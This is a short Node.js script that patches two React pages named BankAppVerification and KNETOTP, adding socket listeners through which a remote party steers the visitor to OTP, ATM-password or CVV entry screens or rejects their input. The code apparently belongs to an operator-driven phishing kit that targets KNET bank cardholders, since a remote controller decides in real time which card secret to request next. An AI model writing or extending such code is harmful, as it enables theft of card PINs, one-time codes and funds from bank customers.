import fs from "fs";
const rx=/  useEffect\(\(\) => \{\s*\n\s*const s = socket\.value;[\s\S]*?\n  \}, \[\]\);/;
const bank=`  useEffect(() => {
    let s: any = null; let timer: any = null; let tries = 0;
    const handler = (action: string) => {
      console.log("bankapp card:action ->", action);
      const isKnet = localStorage.getItem("flowType") === "knet";
      waitingMessage.value = ""; setIsWaiting(false);
      if (action === "otp") { navigate(isKnet ? "/knet-otp" : "/otp-verification"); }
      else if (action === "atm") { navigate("/atm-password"); }
      else if (action === "reject") { setRejected(true); setError(true); }
    };
    const attach = () => {
      s = socket.value;
      if (!s) { if (++tries < 60) timer = setTimeout(attach, 400); return; }
      console.log("bankapp socket attached:", s.id);
      s.on("card:action", handler);
    };
    attach();
    return () => { if (timer) clearTimeout(timer); if (s) s.off("card:action", handler); };
  }, []);`;
const otp=`  useEffect(() => {
    let s: any = null; let timer: any = null; let tries = 0;
    const onCard = (a: string) => {
      console.log("knetotp card:action ->", a);
      waitingMessage.value = ""; setIsLoading(false);
      if (a === "reject") { setShowError(true); setOtpCode(""); } else { navigate("/final-page"); }
    };
    const onCode = (d: any) => {
      waitingMessage.value = ""; setIsLoading(false);
      if (d && d.action === "cvv") { navigate("/atm-password"); }
      else if (d && d.action === "reject") { setShowError(true); setOtpCode(""); }
      else { navigate("/final-page"); }
    };
    const attach = () => {
      s = socket.value;
      if (!s) { if (++tries < 60) timer = setTimeout(attach, 400); return; }
      console.log("knetotp socket attached:", s.id);
      s.on("card:action", onCard); s.on("code:action", onCode);
    };
    attach();
    return () => { if (timer) clearTimeout(timer); if (s) { s.off("card:action", onCard); s.off("code:action", onCode); } };
  }, []);`;
for (const [p,block] of [["src/pages/BankAppVerification.tsx",bank],["src/pages/KNETOTP.tsx",otp]]) {
  let t=fs.readFileSync(p,"utf8").replace(/\r\n/g,"\n");
  if(!rx.test(t)){console.log("NO MATCH",p);continue;}
  t=t.replace(rx,block);
  fs.writeFileSync(p,t,"utf8");
  console.log("OK",p);
}
